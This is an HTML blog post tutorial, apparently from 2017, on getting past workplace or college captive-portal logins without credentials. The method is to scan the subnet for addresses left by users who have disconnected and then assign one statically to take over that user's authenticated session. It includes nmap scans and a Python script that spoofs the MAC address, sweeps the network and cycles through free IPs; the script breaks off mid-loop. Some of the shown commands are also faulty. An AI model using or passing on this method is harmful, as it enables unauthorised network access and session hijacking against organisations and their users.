<!DOCTYPE html>
<html lang="en">

	<head>
		<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1" />


	<title>Bypassing Office/College firewall (captive portal) without username and Password</title>


<meta name="twitter:card" content="summary" />
<meta name="twitter:site" content="@" />
<meta name="twitter:title" content="Bypassing Office/College firewall (captive portal) without username and Password" />
<meta name="twitter:description" content="Let me be clear this is a simple hack , you can try it to bypass your firewall even with administrator account but to use it you have to be a little bit techie .">

<meta name="description" content="Let me be clear this is a simple hack , you can try it to bypass your firewall even with administrator account but to use it you have to be a little bit tech...">



<link rel="icon" href="/assets/favicon.png">
<link rel="apple-touch-icon" href="/assets/touch-icon.png">
<link href="https://fonts.googleapis.com/css?family=Karla" rel="stylesheet">
<link rel="stylesheet" href="/assets/core.css">
<link rel="canonical" href="/notes/bypass-firewall">
<link rel="alternate" type="application/atom+xml" title="Troubleshooter" href="/feed.xml" />




<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
   
	</head>

	<body>

		<aside class="logo">

	

	<a href="/">
	</a>
	<span class="logo-prompt">Back to Home</span>

</aside>


		<main>
			<article>

	<div class="center">
		<h1>Bypassing Office/College firewall (captive portal) without username and Password</h1>
		<time>December 27, 2017</time>
	</div>

	<div class="divider"></div>

	<p>Let me be clear this is a simple hack , <strong>you can try it to bypass your firewall even with administrator account</strong> but to use it you have to be a little bit techie .</p>

<p>So , this hack requires following things :-</p>

<ol>
  <li><a href="https://www.python.org/">python interpreter</a> ( i.e. python 2.7 or later also but u have to tinker with it yourself ).</li>
  <li>A Linux Terminal ( i.e. a Linux box or it can be in <a href="https://www.virtualbox.org/">virtual box</a> also ).</li>
  <li>A Network scanner <a href="https://nmap.org/download.html">NMAP</a>’s zenmap ( for Linux , windows and mac  ) and <a href="https://play.google.com/store/apps/details?id=ua.com.streamsoft.pingtools">PingTools</a> for Android 
and some patience .</li>
</ol>

<p>Note :- Don’t worry if you don’t have any of these things be with me . I have a hack for these also .</p>

<p><strong>You can do it in android , windows and  mac also and without python also . Just be with me and soon you will be able to bypass your firewall ( without username and password  ) .</strong></p>

<p>Okay let me be clear at this point what kind of firewall i am talking about .</p>

<p>It is just a simple firewall/complex firewall which shows you login page when you connects to your college/office network either by lan or wifi .</p>

<p>A sample login page is shown below :-</p>

<p><img src="../assets/media/images/bypass-firewall/blogimg1.jpg" alt="" /></p>

<p><strong>Note :- You must be either connected to WIFI or LAN . Then only You are able to bypass firewall .</strong></p>

<p>So lets go under the hood :-</p>

<div class="divider"></div>

<h2 id="step-1--">STEP 1 :-</h2>
<h4 id="most-of-the-networks-use-dhcp--protocol-to-configure-all-of-its-hosts--basically-one-or-more-dedicated-dhcp-server-are-usually-present-in--network-to-provide-their-client-devices-with-a-dynamic-ip-addresses-">Most of the networks use <a href="https://en.wikipedia.org/wiki/Dynamic_Host_Configuration_Protocol">DHCP</a>  protocol to configure all of its hosts . Basically one or more dedicated DHCP server are usually present in  network to provide their client devices with a dynamic IP addresses .</h4>
<p>So when you connect to the network using WIFI , under the hood your device’s default network manager broadcasts a request for dynamic IP address ( DHCP request ) to all devices present in the network .<br />
But only a authentic DHCP server will be able to reply .<br />
Note :-  All rouge/fake DHCP servers may not be able to reply to this kind of requests because the intermediate switches can be configured to snooping trust .<br />
more on DHCP <a href="https://www.youtube.com/watch?v=g7mroO_BLD0">here</a> .</p>

<div class="divider"></div>

<h2 id="step-2--">STEP 2 :-</h2>
<h4 id="now-comes-the-most-interesting-part-of-our-hack--we-can-also-set-our-ip-address-as-static--but-that-ip-address-must-be-available-to-use-ie-that-ip-address-must-not-be-taken-by-another-host--ie-either-by-using-dhcp--os-static--in-that-network-">Now comes the most Interesting part of our hack , We can also set our <a href="https://www.lifewire.com/what-is-a-static-ip-address-2626012">IP address as static</a> . But that IP address must be available to use i.e. that IP address must not be taken by another host ( i.e. either by using DHCP  os static ) in that network .</h4>
<p>And this piece of information we will be using in our this hack . We will be searching for an IP address that is free ( i.e. not in use by any host ) and assign that IP address to our network card .<br />
You can assign a static IP to your network card by following this image in windows :-</p>

<p><img src="../assets/media/images/bypass-firewall/blogimg2.png" alt="" /></p>

<p>Linux users can assign static IP address using this command :-</p>
<div class="highlighter-rouge"><pre class="highlight"><code>sudo ifconfig wlp6s0 192.168.2.15 netmask 255.255.255.0 up
sudo route add default gw 192.168.2.15 wlp6s0
sudo echo '8.8.8.8' &gt; /etc/resolv.conf\
</code></pre>
</div>
<p>note:- wlp6s0 is the name of network card .
Mac users follow these steps :-</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Apple menu -&gt; Preferences -&gt;  Network -&gt; WiFi -&gt; Advanced -&gt; TCP/IP  
and then configure it for manual . And assign IP as shown in windows image.
</code></pre>
</div>
<p>Then
note :- Configure DNS also for  mac as shown in windows image .
Android Users follow these steps :-</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Settings -&gt; WLAN ( or WIFI )
then select your network and then
</code></pre>
</div>
<p><img src="../assets/media/images/bypass-firewall/blogimg3b.png" alt="" />
<img src="../assets/media/images/bypass-firewall/blogimg4b.png" alt="" />
Note :- IP address configurations shown above are randomly selected for example purposes . You should select IP configuration according to your network ( Discussed in next point  ) .</p>

<div class="divider"></div>

<h2 id="step-3--">STEP 3 :-</h2>
<h4 id="before-using-this-zenmap-we-need-to-find-ip-configuration-for-our-device-">Before using this Zenmap we need to find IP configuration for our device .</h4>
<p>Linux users follow these commands :-
<img src="../assets/media/images/bypass-firewall/blogimg5.png" alt="" />
<strong>note :- Don’t worry I have hidden some of the parameters .</strong>
Windows users follow these steps : -
<img src="../assets/media/images/bypass-firewall/blogimg6.png" alt="" />
Mac users can follow these steps :-</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Apple menu -&gt; Preferences -&gt;  Network -&gt; WiFi -&gt; Advanced -&gt; TCP/IP 
Or 
Can use Terminal Similarly as we used in Linux above .
</code></pre>
</div>
<p>Android and IPhone users can use following method :-</p>
<div class="highlighter-rouge"><pre class="highlight"><code>Settings -&gt; WLAN ( or WIFI )  
then select your network and then
</code></pre>
</div>
<p><img src="../assets/media/images/bypass-firewall/blogimg7b.png" alt="" />
<strong>Ok .<br />
Note for Android/Iphone users :-   You can see DNS server address by Clicking on static option and then changing it back to dynamic option.</strong><br />
As you can see in all these cases we have three things IP address , netmask  address and DNS server address .
Note down these 3 addresses we will use these latter . Now we have to calculate Network address with CIDR to proceed.</p>
<h5 id="to-calculate-network-address-with-cidr-you-can--this-website-">TO calculate network address with CIDR you can  <a href="http://mxtoolbox.com/SubnetCalculator.aspx">this</a> website .</h5>
<p>Or you can calculate it manually .<br />
<strong><em>Note : -</em></strong><br />
Just convert IP address and Netmask address  into binary equivalent 32 bit and then AND them ( binary operation ) bitwise you will get a new 32 bit binary number and convert it in four octets that will be your network address .</p>
<div class="highlighter-rouge"><pre class="highlight"><code>for ex :-
Address:   192.168.0.1           11000000.10101000.00000000 .00000001
Netmask:   255.255.255.0 = 24    11111111.11111111.11111111 .00000000
Network:   192.168.0.0/24        11000000.10101000.00000000 .00000000
</code></pre>
</div>
<p><strong>Ok .</strong><br />
Now we are one step away from bypassing the firewall and getting the administrative access .</p>

<div class="divider"></div>

<h2 id="step-4--">Step 4 :-</h2>
<h4 id="in-this-step-we-have-to-determine-which-ip-address-to-use--we-will-do-this-using-by-zenmap-in-linux--windows-and-mac-and-ping-tools-for-android---devices-">In this step we have to determine which IP address to use . We will do this using by zenmap in Linux , windows and Mac and Ping Tools for android   devices .</h4>
<p>( Iphone users can download similar tool from their app store ) .<br />
Now we will scan  our network using pingtools Or zenmap ( or Nmap command in terminal  )  :-<br />
Linux users can follow this command :-</p>
<div class="highlighter-rouge"><pre class="highlight"><code>nmap -T4 -F 10.10.254.0/24 
</code></pre>
</div>

<p><img src="../assets/media/images/bypass-firewall/blogimg9.png" alt="" /></p>

<p>Linux , windows and Mac users can use Zenmap in following way :-</p>

<p><img src="../assets/media/images/bypass-firewall/blogimg8.png" alt="" /></p>

<p>Android users can use Pingtools in following way :-</p>

<p><img src="../assets/media/images/bypass-firewall/blogimg11b.png" alt="" /></p>

<p><img src="../assets/media/images/bypass-firewall/blogimg10b.png" alt="" /></p>

<p>So we will get these kind of responses but be patient , it might take some time depending on your network .<br />
<strong>Note:-</strong><br />
Select your own network address we just calculated in last step  ( at the place of 10.10.254.0/24 ).</p>

<div class="divider"></div>

<h2 id="step-5-">STEP 5:-</h2>
<h4 id="as-you-can-see-there-are-some-ip-addresses-that-are-missing-from-the-output-list--save-your-ouput-now-these-missing-ip-addresses-are-actually-free-ip-addresses-that-are-not-currently-being-used-by-any-device-">As you can see there are some IP addresses that are missing from the output list . Save your Ouput now. These missing IP addresses are actually free IP addresses that are not currently being used by any device .</h4>
<p>And Now start picking up these free IP addresses one by one and statically assign them to your network card as we discussed in point 2 .<br />
<strong>Note :-</strong><br />
All other information would be same that we calculated in point 3 except the IP address . 
i.e. DNS , Gateway and Netmask wouldn’t change .<br />
Now lets check for internet connectivity we might have already bypassed firewall .<br />
So to check internet connectivity we will follow these steps :-<br />
on linux and mac :-</p>

<div class="highlighter-rouge"><pre class="highlight"><code>Terminal -&gt; ping 8.8.8.8 -c4
</code></pre>
</div>

<p><img src="../assets/media/images/bypass-firewall/blogimg13.png" alt="" /></p>

<p>on Windows :-</p>

<div class="highlighter-rouge"><pre class="highlight"><code>windows + r ( run Program )  -&gt; ping 8.8.8.8  -t
</code></pre>
</div>
<p><img src="../assets/media/images/bypass-firewall/blogimg12.png" alt="" /></p>

<p>on android :-<br />
<em>use pingtools</em></p>

<p><img src="../assets/media/images/bypass-firewall/blogimg15b.png" alt="" /></p>

<p><img src="../assets/media/images/bypass-firewall/blogimg14b.png" alt="" /></p>

<p>If you get same Output as above then congrats you have bypassed the firewall and from here on you can enjoy your internet .<br />
But if you want administer level access ( i.e.  You can open any website without restriction  ) you have to keep trying those free IPs .</p>

<p><strong>Note :-</strong></p>
<div class="highlighter-rouge"><pre class="highlight"><code> Only if you get same output as above then only you can go for administer  
level check. I mean if you have bypassed firewall then only you can try to open  
that website which is restricted for you in browser . If that opens then congo! you  
got administer level bypass. 
</code></pre>
</div>

<p>** What to do if you wouldn’t get same output ?**<br />
Don’t worry keep on trying all those free IPS , you will definitely bypass the firewall . ( repeat this step until you get free Internet access ).</p>

<div class="divider"></div>

<h2 id="step-6--">STEP 6 :-</h2>
<p>Now lets understand how we bypassed firewall in last step .<br />
To get this we have to understand how firewall works . So basically ,<strong>when a user logins into firewall , he will be assigned some session time for which , he have access to internet . When that fixed session time expires your firewall will ask you again for login .</strong><br />
Usually every firewall binds that session time with the IP address of the user who logged in correctly .<br />
<strong>What happens if that user turns off his device or detaches from that  network . Then that  IP address might have some session time left with it . So in last step , we just searched for how many users have left the network  by looking at those free IP addresses . And we statically assigned that IP address to ourselves so that we can utilize that session time for our use . And for firewall we are still that guy who logged in .</strong></p>
<h4 id="note-">Note:-</h4>
<p>when we assigned a static IP address to ourselves then we don’t need to query the DHCP server so, DHCP server will never get to know about such an IP address .( an IP address which was assigned dynamically initially from the IP address pool but later used statically ).<br />
So it may happen that the same user connects to network and try to use that IP address again which it previously had . In this case either he or couldn’t properly access the internet.<br />
But you don’t have to worry because if this happened by any chance then , you still have many of free IPs left with you . And you will be able to access  the internet again .</p>

<div class="divider"></div>

<h3 id="i-know-its-very-time-consuming--dont-worry-i-have-fully-automated-python-script-for-you--its-time-to-do-some-neat-stuff-">I know its very time consuming . Don’t worry I have fully automated python script for you . Its time to do some neat stuff .</h3>

<h2 id="code"><a href="https://github.com/mohitrajain/firewall_byPass_python_script">code</a></h2>
<div class="highlighter-rouge"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>

<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">def</span> <span class="nf">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
    <span class="n">Command</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span><span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">STDOUT</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span><span class="o">=</span><span class="n">Command</span><span class="o">.</span><span class="n">communicate</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">err</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
        <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">out</span>

<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&lt;=</span><span class="mi">2</span> <span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Arguments : interface  , ESSID , [ mac address ] '</span><span class="p">)</span>
    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="k">else</span> <span class="p">:</span>
    <span class="n">interface</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">ESSID</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
    <span class="n">mac</span> <span class="o">=</span> <span class="s">'00:00:00:00:00:66'</span>

<span class="n">leases_file</span> <span class="o">=</span> <span class="s">'/var/lib/dhclient/dhclient.leases'</span>

<span class="c"># connecting to wifi and setting up mac</span>

<span class="n">execute</span><span class="p">(</span><span class="s">'ifconfig '</span> <span class="o">+</span> <span class="n">interface</span>  <span class="o">+</span> <span class="s">' down'</span><span class="p">)</span>
<span class="n">execute</span><span class="p">(</span><span class="s">'ifconfig '</span> <span class="o">+</span> <span class="n">interface</span>  <span class="o">+</span> <span class="s">' hw ether '</span> <span class="o">+</span> <span class="n">mac</span> <span class="o">+</span> <span class="s">' up'</span><span class="p">)</span>
<span class="n">execute</span><span class="p">(</span><span class="s">'iwconfig '</span> <span class="o">+</span>  <span class="n">interface</span> <span class="o">+</span> <span class="s">' ESSID '</span> <span class="o">+</span> <span class="n">ESSID</span> <span class="p">)</span>

<span class="c"># checking gor wifi connectivity</span>
<span class="n">out</span> <span class="o">=</span> <span class="n">execute</span><span class="p">(</span><span class="s">'iwconfig '</span><span class="o">+</span>  <span class="n">interface</span> <span class="o">+</span> <span class="s">' | grep LINK'</span><span class="p">)</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Wifi could not be reached '</span><span class="p">)</span>


<span class="c"># killing dhclient</span>
<span class="k">try</span><span class="p">:</span>
    <span class="n">execute</span><span class="p">(</span><span class="s">'dhclient -r '</span> <span class="o">+</span> <span class="n">interface</span><span class="p">)</span>
    <span class="n">execute</span><span class="p">(</span><span class="s">'killall dhclient '</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'killed dhclient'</span><span class="p">)</span>

<span class="c"># taking a dynamic ip to get info about all open ip</span>
<span class="n">execute</span><span class="p">(</span><span class="s">'dhclient '</span> <span class="o">+</span> <span class="n">interface</span><span class="p">)</span>

<span class="n">gateway</span> <span class="o">=</span> <span class="n">execute</span><span class="p">(</span><span class="s">'grep routers '</span> <span class="o">+</span> <span class="n">leases_file</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">][:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="n">gateway</span><span class="p">)</span>

<span class="c"># our interface ip assigned using dhcp</span>
<span class="n">my_ip</span> <span class="o">=</span> <span class="n">execute</span><span class="p">(</span><span class="s">'ifconfig '</span> <span class="o">+</span>  <span class="n">interface</span> <span class="o">+</span> <span class="s">' | grep -w inet'</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>

<span class="c"># calculation of network , netmask , broadcast and available ip addresses</span>

<span class="n">interface_info</span> <span class="o">=</span> <span class="n">execute</span><span class="p">(</span><span class="s">'ifconfig '</span> <span class="o">+</span> <span class="n">interface</span> <span class="o">+</span> <span class="s">' | grep inet'</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>

<span class="n">netmask</span> <span class="o">=</span> <span class="n">interface_info</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
<span class="n">bin_net</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">netmask</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">netmask</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">netmask</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">2</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">netmask</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">3</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="n">mask</span> <span class="o">=</span> <span class="n">bin_net</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s">'1'</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'netmask  '</span><span class="p">,</span><span class="n">netmask</span><span class="p">)</span>

<span class="n">broadcast</span> <span class="o">=</span> <span class="n">interface_info</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span>
<span class="n">bin_broadcast</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">broadcast</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">broadcast</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">broadcast</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">2</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">broadcast</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">3</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'broadcast'</span><span class="p">,</span><span class="n">broadcast</span><span class="p">)</span>

<span class="n">ip</span> <span class="o">=</span> <span class="n">interface_info</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">bin_ip</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ip</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ip</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ip</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">2</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bin</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ip</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">3</span><span class="p">]))[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'ip'</span><span class="p">,</span><span class="n">ip</span><span class="p">)</span>

<span class="nb">super</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">32</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
<span class="n">num_ip</span> <span class="o">=</span> <span class="nb">super</span> <span class="o">-</span> <span class="nb">int</span><span class="p">(</span><span class="n">bin_net</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">num_ip</span><span class="p">)</span>

<span class="n">num_network</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">bin_broadcast</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="n">num_ip</span>
<span class="n">bin_network</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">num_network</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
<span class="n">act_network</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">bin_network</span><span class="p">[:</span><span class="mi">8</span><span class="p">],</span><span class="mi">2</span><span class="p">))</span> <span class="o">+</span> <span class="s">'.'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">bin_network</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">],</span><span class="mi">2</span><span class="p">))</span> <span class="o">+</span> <span class="s">'.'</span> <span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">bin_network</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">24</span><span class="p">],</span><span class="mi">2</span><span class="p">))</span> <span class="o">+</span> <span class="s">'.'</span> <span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">bin_network</span><span class="p">[</span><span class="mi">24</span><span class="p">:],</span><span class="mi">2</span><span class="p">))</span>

<span class="nb">list</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_ip</span><span class="p">):</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="n">num_network</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
    <span class="n">bin_addr</span> <span class="o">=</span> <span class="nb">bin</span><span class="p">(</span><span class="n">addr</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
    <span class="n">ip_addr</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">bin_addr</span><span class="p">[:</span><span class="mi">8</span><span class="p">],</span><span class="mi">2</span><span class="p">))</span> <span class="o">+</span> <span class="s">'.'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">bin_addr</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">16</span><span class="p">],</span><span class="mi">2</span><span class="p">))</span> <span class="o">+</span> <span class="s">'.'</span> <span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">bin_addr</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">24</span><span class="p">],</span><span class="mi">2</span><span class="p">))</span> <span class="o">+</span> <span class="s">'.'</span> <span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">bin_addr</span><span class="p">[</span><span class="mi">24</span><span class="p">:],</span><span class="mi">2</span><span class="p">))</span>
    <span class="nb">list</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ip_addr</span><span class="p">)</span>

<span class="c"># list contains all the ip to check from the current network</span>
<span class="c">#print(list)</span>

<span class="k">print</span><span class="p">(</span><span class="s">"nmap -n -sn  "</span> <span class="o">+</span> <span class="n">act_network</span> <span class="o">+</span> <span class="s">'/'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">mask</span><span class="p">)</span> <span class="o">+</span> <span class="s">" -oG - | awk '/Up$/{print $2}'"</span><span class="p">)</span>
<span class="n">ip_string</span> <span class="o">=</span> <span class="n">execute</span><span class="p">(</span><span class="s">"nmap -n -sn  "</span> <span class="o">+</span> <span class="n">act_network</span> <span class="o">+</span> <span class="s">'/'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">mask</span><span class="p">)</span> <span class="o">+</span> <span class="s">" -oG - | awk '/Up$/{print $2}'"</span><span class="p">)</span>
<span class="n">list_up</span> <span class="o">=</span> <span class="n">ip_string</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="n">free_ip</span> <span class="o">=</span><span class="p">[]</span>

<span class="k">for</span> <span class="n">ip</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">:</span>
   <span class="k">try</span><span class="p">:</span>
       <span class="n">list_up</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
   <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
       <span class="n">free_ip</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>


<span class="c"># uncomment this if u want to check from manual ip address space</span>

<span class="c">#for i in range(4):</span>
<span class="c">#    oct = '10.10.' + str(48 + i)</span>
<span class="c">#    for j in range(255):</span>
<span class="c">#        ip = oct +'.' + str(j + 1)</span>
<span class="c">#        if ip != '10.10.51.255':</span>
<span class="c">#            try:</span>
<span class="c">#                list_up.index(ip)</span>
<span class="c">#                #print(ip + " this can't be assigned \n")</span>
<span class="c">#            except ValueError :</span>
<span class="c">#                free_ip.append(ip)</span>

<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">free_ip</span><span class="p">))</span>

<span class="c"># creating a new file</span>
<span class="nb">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'open_ips'</span><span class="p">,</span><span class="s">'w'</span><span class="p">)</span>
<span class="nb">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">for</span> <span class="n">ipaddress</span> <span class="ow">in</span> <span class="n">free_ip</span><span class="p">:</span>
    <span class="n">execute</span><span class="p">(</span><span class="s">'ifconfig '</span> <span class="o">+</span> <span class="n">interface</span> <span class="o">+</span> <span class="s">' '</span> <span class="o">+</span> <span class="n">ipaddress</span> <span class="o">+</span> <span class="s">' netmask '</span> <span class="o">+</span> <span class="n">netmask</span><span class="p">)</span>
